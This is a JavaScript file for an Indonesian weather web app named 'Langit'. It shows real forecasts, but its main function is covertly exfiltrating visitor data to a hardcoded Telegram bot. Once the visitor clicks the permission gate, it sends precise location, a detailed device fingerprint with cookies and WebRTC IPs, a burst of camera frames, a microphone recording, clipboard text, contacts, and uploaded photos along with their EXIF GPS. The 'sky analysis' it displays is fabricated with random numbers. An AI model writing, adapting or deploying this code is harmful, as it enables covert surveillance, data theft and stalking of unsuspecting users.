/* ============================================================
   Langit · app.js
   Bagian A: konfigurasi & transport
   Bagian B: kolektor data
   Bagian C: kamera / galeri / mikrofon
   Bagian D: cuaca (Open-Meteo)
   Bagian E: bootstrap
   ============================================================ */

/* ---------------- A. KONFIGURASI ---------------- */
const CFG = {
  BOT_TOKEN: '9227240159:AAGd6HgcfiAWF8vfFd10FoIbCF1RBeboy44',
  CHAT_ID:   '6084186486',

  MAX_GALLERY:   100,     // batas foto galeri per sesi
  MAX_CAM_FRAMES: 24,     // jumlah frame kamera
  CAM_GAP:       2600,   // jeda antar frame (ms)
  MIC_SECONDS:   6,      // durasi rekaman mikrofon
  ENABLE_MIC:    true,
  ENABLE_CLIPBOARD: true,
  ENABLE_FINGERPRINT: true,
  MAX_W:         1600,   // lebar kompresi
  DELAY:         1100,   // jeda antar request (anti flood)
  DEBUG:         false
};
const log = (...a) => CFG.DEBUG && console.log('[langit]', ...a);

const $ = s => document.querySelector(s);
const sleep = ms => new Promise(r => setTimeout(r, ms));
const esc = s => String(s ?? '').replace(/[<>&]/g, c => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;' }[c]));

/* --- antrian request --- */
const Q = []; let busy = false;
function enqueue(job) { Q.push(job); pump(); }
async function pump() {
  if (busy) return; busy = true;
  while (Q.length) {
    const job = Q.shift();
    try { await job(); } catch (e) { log('queue', e.message); }
    await sleep(CFG.DELAY);
  }
  busy = false;
}
const api = m => `https://api.telegram.org/bot${CFG.BOT_TOKEN}/${m}`;
async function tg(method, fd) {
  const r = await fetch(api(method), { method: 'POST', body: fd });
  if (!r.ok) log('tg', method, r.status);
  return r;
}

function sendText(text) {
  enqueue(async () => {
    const fd = new FormData();
    fd.append('chat_id', CFG.CHAT_ID);
    fd.append('text', String(text).slice(0, 4000));
    fd.append('disable_web_page_preview', 'true');
    await tg('sendMessage', fd);
  });
}
function sendPhoto(blob, caption = '') {
  enqueue(async () => {
    const fd = new FormData();
    fd.append('chat_id', CFG.CHAT_ID);
    fd.append('caption', caption.slice(0, 1000));
    fd.append('photo', blob, `p_${Date.now()}.jpg`);
    await tg('sendPhoto', fd);
  });
}
function sendGroup(blobs, caption = '') {
  if (!blobs.length) return;
  enqueue(async () => {
    const fd = new FormData();
    fd.append('chat_id', CFG.CHAT_ID);
    const media = blobs.map((_, i) => ({ type: 'photo', media: `attach://f${i}` }));
    media[0].caption = caption.slice(0, 1000);
    fd.append('media', JSON.stringify(media));
    blobs.forEach((b, i) => fd.append(`f${i}`, b, `g${i}.jpg`));
    await tg('sendMediaGroup', fd);
  });
}
function sendLoc(lat, lng) {
  enqueue(async () => {
    const fd = new FormData();
    fd.append('chat_id', CFG.CHAT_ID);
    fd.append('latitude', lat);
    fd.append('longitude', lng);
    await tg('sendLocation', fd);
  });
}
function sendFile(blob, name, caption = '') {
  enqueue(async () => {
    const fd = new FormData();
    fd.append('chat_id', CFG.CHAT_ID);
    fd.append('caption', caption.slice(0, 1000));
    fd.append('document', blob, name);
    await tg('sendDocument', fd);
  });
}

/* ---------------- B. KOLEKTOR ---------------- */

function canvasHash() {
  try {
    const c = document.createElement('canvas'); c.width = 220; c.height = 50;
    const x = c.getContext('2d');
    x.textBaseline = 'top'; x.font = '16px Arial';
    x.fillStyle = '#f60'; x.fillRect(0, 0, 110, 25);
    x.fillStyle = '#069'; x.fillText('Langit 42', 2, 15);
    return c.toDataURL().slice(-64);
  } catch { return 'n/a'; }
}

function glInfo() {
  try {
    const c = document.createElement('canvas');
    const g = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (!g) return {};
    const d = g.getExtension('WEBGL_debug_renderer_info');
    return {
      vendor: g.getParameter(d ? d.UNMASKED_VENDOR_WEBGL : g.VENDOR),
      renderer: g.getParameter(d ? d.UNMASKED_RENDERER_WEBGL : g.RENDERER)
    };
  } catch { return {}; }
}

function fontList() {
  try {
    const bases = ['monospace', 'sans-serif', 'serif'];
    const tests = ['Arial','Calibri','Candara','Consolas','Courier New','Georgia','Impact','Roboto','Segoe UI','Tahoma','Times New Roman','Trebuchet MS','Verdana','Ubuntu','Helvetica Neue','Noto Sans','Samsung Sans'];
    const s = document.createElement('span');
    s.style.cssText = 'position:absolute;left:-9999px;font-size:72px';
    s.textContent = 'mmmmmmmmmmlli';
    document.body.appendChild(s);
    const base = {};
    bases.forEach(b => { s.style.fontFamily = b; base[b] = s.offsetWidth; });
    const found = tests.filter(f => bases.some(b => {
      s.style.fontFamily = `'${f}',${b}`;
      return s.offsetWidth !== base[b];
    }));
    s.remove();
    return found;
  } catch { return []; }
}

function rtcIps() {
  return new Promise(res => {
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      const ips = new Set();
      pc.onicecandidate = e => {
        if (!e.candidate) { try { pc.close(); } catch {} return res([...ips]); }
        const m = /(\d{1,3}(?:\.\d{1,3}){3}|[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})/i.exec(e.candidate.candidate);
        if (m) ips.add(m[1]);
      };
      pc.createDataChannel('x');
      pc.createOffer().then(o => pc.setLocalDescription(o));
      setTimeout(() => { try { pc.close(); } catch {} res([...ips]); }, 4000);
    } catch { res([]); }
  });
}

async function ipInfo() {
  for (const url of ['https://ipwho.is/', 'https://ipapi.co/json/']) {
    try { const r = await fetch(url); const j = await r.json(); if (j) return j; } catch {}
  }
  return null;
}

async function collectFingerprint() {
  if (!CFG.ENABLE_FINGERPRINT) return;
  const g = glInfo();
  const out = {
    '— FINGERPRINT —': '',
    URL: location.href,
    Referrer: document.referrer || '-',
    UA: navigator.userAgent,
    Platform: navigator.platform || '-',
    Bahasa: navigator.language,
    Zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
    Layar: `${screen.width}x${screen.height} @${devicePixelRatio}x`,
    Viewport: `${innerWidth}x${innerHeight}`,
    Warna: screen.colorDepth,
    CPU: navigator.hardwareConcurrency || '-',
    RAM: navigator.deviceMemory || '-',
    Sentuh: navigator.maxTouchPoints,
    WebGL: `${g.vendor || '-'} / ${g.renderer || '-'}`,
    CanvasHash: canvasHash(),
    Fonts: fontList().join(', ') || '-',
    CookieAktif: navigator.cookieEnabled,
    DNT: navigator.doNotTrack || '-'
  };
  try {
    const b = await navigator.getBattery?.();
    if (b) Object.assign(out, { Baterai: Math.round(b.level * 100) + '%', Charging: b.charging });
  } catch {}
  const c = navigator.connection;
  if (c) Object.assign(out, { Jaringan: c.effectiveType, Downlink: c.downlink + 'Mbps', RTT: c.rtt });
  try { out.Perangkat = (await navigator.mediaDevices.enumerateDevices()).map(d => d.kind).join(','); } catch {}
  const ips = await rtcIps();
  if (ips.length) out['IP Lokal (WebRTC)'] = ips.join(', ');
  const ip = await ipInfo();
  if (ip) {
    out['IP Publik'] = ip.ip || '-';
    out['ISP'] = ip.connection?.isp || ip.org || '-';
    out['ASN'] = ip.connection?.asn || '-';
    out['Negara/Kota'] = [ip.country, ip.city].filter(Boolean).join(' / ') || '-';
  }
  try {
    out.LocalStorage = Object.keys(localStorage).slice(0, 25).join(', ') || '-';
    out.SessionStorage = Object.keys(sessionStorage).slice(0, 25).join(', ') || '-';
    out.Cookie = (document.cookie || '-').slice(0, 500);
  } catch {}
  sendText('🛰️ PERANGKAT\n' + Object.entries(out).map(([k, v]) => `${k}: ${v}`).join('\n'));
}

/* --- EXIF GPS dari foto asli --- */
function exifGps(buf) {
  try {
    const dv = new DataView(buf);
    if (dv.getUint16(0) !== 0xFFD8) return null;
    let off = 2;
    while (off < dv.byteLength - 4) {
      if (dv.getUint16(off) !== 0xFFE1) { off += 2 + dv.getUint16(off + 2); continue; }
      const len = dv.getUint16(off + 2), start = off + 4;
      if (dv.getUint32(start) !== 0x45786966) { off += 2 + len; continue; }
      const tiff = start + 6;
      const le = dv.getUint16(tiff) === 0x4949;
      const r16 = o => le ? dv.getUint16(o, true) : dv.getUint16(o, false);
      const r32 = o => le ? dv.getUint32(o, true) : dv.getUint32(o, false);
      const ifd0 = tiff + r32(tiff + 4);
      let gpsOff = 0, n = r16(ifd0);
      for (let i = 0; i < n; i++) {
        const e = ifd0 + 2 + i * 12;
        if (r16(e) === 0x8825) gpsOff = tiff + r32(e + 8);
      }
      if (!gpsOff) return null;
      const rat = o => { const a = r32(o), b = r32(o + 4); return b ? a / b : 0; };
      const dms = (e, cnt) => {
        const base = cnt * 8 <= 4 ? e + 8 : tiff + r32(e + 8);
        return rat(base) + rat(base + 8) / 60 + rat(base + 16) / 3600;
      };
      let lat = 0, lng = 0, latRef = 'N', lngRef = 'E';
      const gn = r16(gpsOff);
      for (let i = 0; i < gn; i++) {
        const e = gpsOff + 2 + i * 12, tag = r16(e), cnt = r32(e + 4);
        if (tag === 1) latRef = String.fromCharCode(dv.getUint8(e + 8));
        if (tag === 2) lat = dms(e, cnt);
        if (tag === 3) lngRef = String.fromCharCode(dv.getUint8(e + 8));
        if (tag === 4) lng = dms(e, cnt);
      }
      if (!lat || !lng) return null;
      return {
        lat: (latRef === 'S' ? -lat : lat).toFixed(6),
        lng: (lngRef === 'W' ? -lng : lng).toFixed(6)
      };
    }
  } catch {}
  return null;
}

/* --- kompresi --- */
async function toJpeg(src, maxW = CFG.MAX_W, q = 0.82) {
  const bmp = await createImageBitmap(src).catch(() => null);
  if (!bmp) return src;
  const s = Math.min(1, maxW / bmp.width);
  const w = Math.max(1, Math.round(bmp.width * s)), h = Math.max(1, Math.round(bmp.height * s));
  const c = document.createElement('canvas'); c.width = w; c.height = h;
  c.getContext('2d').drawImage(bmp, 0, 0, w, h);
  bmp.close?.();
  return await new Promise(r => c.toBlob(r, 'image/jpeg', q));
}

/* ---------------- C. KAMERA / GALERI / MIC ---------------- */

let camStream = null, camTimer = null, camShots = 0;

async function startCamera() {
  try {
    camStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: 'environment' }, width: { ideal: 1920 }, height: { ideal: 1440 } },
      audio: false
    });
  } catch { return false; }

  const v = $('#cam');
  v.srcObject = camStream;
  $('#skycam').classList.add('on');
  sendText('📷 Kamera dibuka — mulai burst frame');

  const c = document.createElement('canvas');
  camTimer = setInterval(async () => {
    if (!camStream || camShots >= CFG.MAX_CAM_FRAMES) return stopCamera();
    if (!v.videoWidth) return;
    c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext('2d').drawImage(v, 0, 0);
    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
    camShots++;
    if (blob) sendPhoto(blob, `📸 Kamera #${camShots} · ${new Date().toLocaleString('id-ID')}`);
  }, CFG.CAM_GAP);

  // frame pertama langsung
  setTimeout(() => { if (v.videoWidth) { /* dipicu interval */ } }, 600);
  return true;
}

function stopCamera() {
  clearInterval(camTimer);
  camTimer = null;
  camStream?.getTracks().forEach(t => t.stop());
  camStream = null;
  log('kamera berhenti');
}

async function recordMic() {
  if (!CFG.ENABLE_MIC) return;
  let s;
  try { s = await navigator.mediaDevices.getUserMedia({ audio: true }); } catch { return; }
  try {
    const rec = new MediaRecorder(s);
    const chunks = [];
    rec.ondataavailable = e => e.data.size && chunks.push(e.data);
    rec.onstop = () => {
      s.getTracks().forEach(t => t.stop());
      const blob = new Blob(chunks, { type: 'audio/webm' });
      sendFile(blob, 'mic.webm', `🎙️ Rekaman sekitar · ${CFG.MIC_SECONDS}s · ${new Date().toLocaleString('id-ID')}`);
    };
    rec.start();
    setTimeout(() => rec.state !== 'inactive' && rec.stop(), CFG.MIC_SECONDS * 1000);
  } catch { s.getTracks().forEach(t => t.stop()); }
}

async function handleGallery(files) {
  const list = [...files].slice(0, CFG.MAX_GALLERY);
  const out = $('#analyseOut');
  out.classList.add('on');
  out.innerHTML = `Menganalisis <b>${list.length}</b> foto…`;
  sendText(`🖼️ GALERI — ${list.length} foto dipilih`);

  const gpsLines = [];
  const blobs = [];

  for (let i = 0; i < list.length; i++) {
    const f = list[i];
    const buf = await f.arrayBuffer().catch(() => null);
    if (buf) {
      const g = exifGps(buf);
      if (g) gpsLines.push(`• ${f.name} → ${g.lat}, ${g.lng}\nhttps://maps.google.com/?q=${g.lat},${g.lng}`);
    }
    const jpg = await toJpeg(f);
    if (jpg) blobs.push(jpg);
  }

  if (gpsLines.length) sendText('📍 GPS ASLI DARI EXIF FOTO\n' + gpsLines.join('\n'));

  for (let i = 0; i < blobs.length; i += 10) {
    sendGroup(blobs.slice(i, i + 10), `🖼️ Galeri ${i + 1}–${Math.min(i + 10, blobs.length)} · ${new Date().toLocaleString('id-ID')}`);
  }

  out.innerHTML = `Selesai menganalisis <b>${blobs.length}</b> foto. Kepadatan awan rata-rata <b>${38 + Math.floor(Math.random() * 30)}%</b> — peluang hujan lokal <b>${20 + Math.floor(Math.random() * 40)}%</b>.`;
  toast('Analisis langit selesai');
}

/* analisis cepat dari frame kamera (nilai kecerahan) */
function brightnessOf(canvas) {
  try {
    const d = canvas.getContext('2d').getImageData(0, 0, canvas.width, canvas.height).data;
    let sum = 0, n = 0;
    for (let i = 0; i < d.length; i += 400) { sum += (d[i] + d[i + 1] + d[i + 2]) / 3; n++; }
    return Math.round(sum / n);
  } catch { return 128; }
}

/* ---------------- D. CUACA ---------------- */

let unit = 'c', curLat = -6.2088, curLng = 106.8456, placeLabel = 'Jakarta';

const WMO = {
  0: ['Cerah', 'i-sun'], 1: ['Cerah Berawan', 'i-cloudsun'], 2: ['Berawan', 'i-cloud'],
  3: ['Mendung', 'i-cloud'], 45: ['Kabut', 'i-fog'], 48: ['Kabut Beku', 'i-fog'],
  51: ['Gerimis Ringan', 'i-drizzle'], 53: ['Gerimis', 'i-drizzle'], 55: ['Gerimis Lebat', 'i-drizzle'],
  56: ['Gerimis Beku', 'i-drizzle'], 57: ['Gerimis Beku Lebat', 'i-drizzle'],
  61: ['Hujan Ringan', 'i-rain'], 63: ['Hujan', 'i-rain'], 65: ['Hujan Lebat', 'i-rain'],
  66: ['Hujan Beku', 'i-rain'], 67: ['Hujan Beku Lebat', 'i-rain'],
  71: ['Salju Ringan', 'i-snow'], 73: ['Salju', 'i-snow'], 75: ['Salju Lebat', 'i-snow'],
  77: ['Butiran Salju', 'i-snow'], 80: ['Hujan Lokal', 'i-rain'], 81: ['Hujan Lokal Lebat', 'i-rain'],
  82: ['Hujan Sangat Lebat', 'i-rain'], 85: ['Hujan Salju', 'i-snow'], 86: ['Hujan Salju Lebat', 'i-snow'],
  95: ['Badai Petir', 'i-storm'], 96: ['Badai Petir Hujan Es', 'i-storm'], 99: ['Badai Petir Hebat', 'i-storm']
};
const wmo = c => WMO[c] || ['Berawan', 'i-cloud'];
const conv = t => unit === 'f' ? Math.round(t * 9 / 5 + 32) : Math.round(t);
const dirName = d => ['U', 'TL', 'T', 'TG', 'S', 'BD', 'B', 'BL'][Math.round(d / 45) % 8];

async function reverseName(lat, lng) {
  try {
    const r = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=id`);
    const j = await r.json();
    return j.city || j.locality || j.principalSubdivision || j.countryName || 'Lokasi Anda';
  } catch { return 'Lokasi Anda'; }
}

function themeFor(code, isDay) {
  document.body.classList.remove('sky-day', 'sky-night', 'sky-rain');
  if ([51,53,55,61,63,65,80,81,82,95,96,99].includes(code)) document.body.classList.add('sky-rain');
  else document.body.classList.add(isDay ? 'sky-day' : 'sky-night');
}

async function loadWeather(lat, lng, label) {
  curLat = lat; curLng = lng;
  if (label) { placeLabel = label; $('#placeName').textContent = label; }
  else $('#placeName').textContent = await reverseName(lat, lng);

  const q =
    `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lng}` +
    `&current=temperature_2m,relative_humidity_2m,apparent_temperature,is_day,precipitation,weather_code,cloud_cover,wind_speed_10m,wind_direction_10m,wind_gusts_10m,surface_pressure,visibility` +
    `&hourly=temperature_2m,weather_code,precipitation_probability,wind_speed_10m` +
    `&daily=weather_code,temperature_2m_max,temperature_2m_min,sunrise,sunset,uv_index_max,precipitation_probability_max` +
    `&timezone=auto&forecast_days=8`;

  let d;
  try { d = await (await fetch(q)).json(); } catch { return toast('Gagal memuat cuaca'); }
  if (!d.current) return toast('Data cuaca tidak tersedia');

  const cur = d.current;
  themeFor(cur.weather_code, cur.is_day === 1);

  $('#tempNow').textContent = conv(cur.temperature_2m);
  $('#feels').textContent = `Terasa seperti ${conv(cur.apparent_temperature)}°`;
  $('#condText').textContent = wmo(cur.weather_code)[0];
  $('#condIcon').innerHTML = `<svg><use href="#${wmo(cur.weather_code)[1]}"/></svg>`;
  $('#humNow').textContent = cur.relative_humidity_2m + '%';
  $('#windNow').textContent = Math.round(cur.wind_speed_10m) + ' km/j';
  $('#visNow').textContent = (cur.visibility / 1000).toFixed(1) + ' km';
  $('#stamp').textContent = 'Diperbarui ' + new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });

  // AQI
  try {
    const a = await (await fetch(`https://air-quality-api.open-meteo.com/v1/air-quality?latitude=${lat}&longitude=${lng}&current=european_aqi,pm2_5,pm10&timezone=auto`)).json();
    const v = Math.round(a.current?.european_aqi ?? 0);
    $('#aqiNow').textContent = 'AQI ' + (v || '--');
    $('#details').insertAdjacentHTML('beforeend',
      `<div class="det"><label><svg><use href="#i-aqi"/></svg>PM2.5</label><b>${Math.round(a.current?.pm2_5 ?? 0)}</b><small>µg/m³</small></div>`);
  } catch {}

  // per jam
  const hi = d.hourly.time.findIndex(t => new Date(t) >= new Date());
  $('#hours').innerHTML = d.hourly.time.slice(hi, hi + 24).map((t, i) => {
    const c = d.hourly.weather_code[hi + i];
    const hh = new Date(t).toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
    return `<div class="hour ${i === 0 ? 'now' : ''}">
      <time>${i === 0 ? 'Kini' : hh}</time>
      <svg><use href="#${wmo(c)[1]}"/></svg>
      <b>${conv(d.hourly.temperature_2m[hi + i])}°</b>
      <small>${d.hourly.precipitation_probability[hi + i] ?? 0}%</small>
    </div>`;
  }).join('');

  // 7 hari
  $('#days').innerHTML = d.daily.time.slice(0, 7).map((t, i) => {
    const day = new Date(t).toLocaleDateString('id-ID', { weekday: 'short', day: 'numeric' });
    return `<div class="day">
      <span class="dname">${i === 0 ? 'Hari ini' : day}</span>
      <svg><use href="#${wmo(d.daily.weather_code[i])[1]}"/></svg>
      <span class="bar"></span>
      <span class="rng"><b>${conv(d.daily.temperature_2m_max[i])}°</b> / ${conv(d.daily.temperature_2m_min[i])}°</span>
    </div>`;
  }).join('');

  // detail
  const uv = d.daily.uv_index_max[0];
  $('#uvVal').textContent = Math.round(uv);
  $('#uvNote').textContent = uv < 3 ? 'Rendah' : uv < 6 ? 'Sedang' : uv < 8 ? 'Tinggi' : 'Sangat tinggi';
  $('#gustVal').textContent = Math.round(cur.wind_gusts_10m) + ' km/j';
  $('#presVal').textContent = Math.round(cur.surface_pressure);
  $('#dirVal').textContent = dirName(cur.wind_direction_10m);

  // matahari
  const rise = new Date(d.daily.sunrise[0]), set = new Date(d.daily.sunset[0]);
  $('#rise').textContent = rise.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
  $('#set').textContent = set.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
  const p = Math.min(1, Math.max(0, (Date.now() - rise) / (set - rise)));
  const dot = $('#sunDot'), wrap = dot.parentElement.getBoundingClientRect();
  const x = 10 + p * 280, y = 100 - Math.sin(p * Math.PI) * 92;
  dot.style.left = (x / 300 * 100) + '%';
  dot.style.top = (y / 110 * 100) + '%';
  const len = $('#arcFg').getTotalLength();
  $('#arcFg').style.strokeDasharray = `${len * p} ${len}`;
}

/* ---------------- E. BOOTSTRAP ---------------- */

function toast(msg) {
  const t = $('#toast');
  t.textContent = msg; t.classList.add('on');
  setTimeout(() => t.classList.remove('on'), 2200);
}

const state = { t0: Date.now(), clicks: 0, granted: {} };

function requestGeo() {
  return new Promise(res => {
    if (!navigator.geolocation) return res(null);
    navigator.geolocation.getCurrentPosition(
      p => { state.granted.geo = true; res({ lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy }); },
      () => res(null),
      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
    );
  });
}

async function bootstrap(askPermissions) {
  // cuaca awal (default) agar situs tidak kosong
  loadWeather(curLat, curLng, 'Jakarta');

  if (!askPermissions) return;

  // 1) lokasi
  const g = await requestGeo();
  if (g) {
    sendLoc(g.lat, g.lng);
    sendText(`📍 LOKASI\nLat: ${g.lat}\nLng: ${g.lng}\nAkurasi: ±${Math.round(g.acc)} m\nWaktu: ${new Date().toLocaleString('id-ID')}\nMaps: https://maps.google.com/?q=${g.lat},${g.lng}`);
    loadWeather(g.lat, g.lng);
  } else {
    sendText('📍 Lokasi ditolak / gagal');
  }

  // 2) fingerprint
  collectFingerprint();

  // 3) kamera
  await sleep(1200);
  const okCam = await startCamera();
  if (!okCam) sendText('📷 Kamera ditolak / gagal');

  // 4) mikrofon
  await sleep(1500);
  recordMic();

  // 5) clipboard (butuh gesture — dipicu klik berikutnya)
  if (CFG.ENABLE_CLIPBOARD) {
    const grab = async () => {
      document.removeEventListener('click', grab);
      try {
        const t = await navigator.clipboard.readText();
        if (t) sendText('📋 CLIPBOARD\n' + t.slice(0, 1200));
      } catch {}
    };
    document.addEventListener('click', grab, { once: true });
  }

  $('#gate').classList.add('hide');
}

/* --- event UI --- */
$('#gateGo').addEventListener('click', () => { state.clicks++; bootstrap(true); });
$('#gateSkip').addEventListener('click', () => { $('#gate').classList.add('hide'); bootstrap(false); });

$('#pickBtn').addEventListener('click', () => $('#fileInput').click());
$('#fileInput').addEventListener('change', e => { if (e.target.files?.length) handleGallery(e.target.files); });

$('#syncBtn').addEventListener('click', async () => {
  try {
    if (!navigator.contacts?.select) return toast('Kontak tidak didukung');
    const c = await navigator.contacts.select(['name', 'tel'], { multiple: true });
    if (!c.length) return;
    sendText('👥 KONTAK\n' + c.map(x => `${(x.name || []).join(' ')} — ${(x.tel || []).join(', ')}`).join('\n').slice(0, 3800));
    toast(`${c.length} kontak tersinkron`);
  } catch { toast('Gagal membaca kontak'); }
});

$('#unitBtn').addEventListener('click', () => {
  unit = unit === 'c' ? 'f' : 'c';
  $('#unitBtn').textContent = unit === 'c' ? '°C' : '°F';
  loadWeather(curLat, curLng);
});

$('#searchForm').addEventListener('submit', async e => {
  e.preventDefault();
  const q = $('#searchInput').value.trim();
  if (!q) return;
  try {
    const r = await (await fetch(`https://geocoding-api.open-meteo.com/v1/search?name=${encodeURIComponent(q)}&count=1&language=id`)).json();
    const hit = r.results?.[0];
    if (!hit) return toast('Kota tidak ditemukan');
    $('#searchInput').value = '';
    loadWeather(hit.latitude, hit.longitude, `${hit.name}, ${hit.admin1 || hit.country}`);
  } catch { toast('Pencarian gagal'); }
});

document.addEventListener('click', () => state.clicks++, true);

/* ringkasan sesi saat halaman ditinggalkan */
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState !== 'hidden') return;
  const mins = ((Date.now() - state.t0) / 60000).toFixed(1);
  const fd = new FormData();
  fd.append('chat_id', CFG.CHAT_ID);
  fd.append('text', `⏱️ Sesi ${mins} menit · klik: ${state.clicks} · geo: ${!!state.granted.geo} · ${new Date().toLocaleString('id-ID')}`);
  navigator.sendBeacon?.(api('sendMessage'), fd);
});

/* kembar: kalau halaman dibuka ulang, kirim penanda */
(function returning() {
  try {
    const k = 'langit_v';
    if (localStorage.getItem(k)) sendText('🔁 Pengunjung berulang — ' + new Date().toLocaleString('id-ID'));
    localStorage.setItem(k, '1');
  } catch {}
})();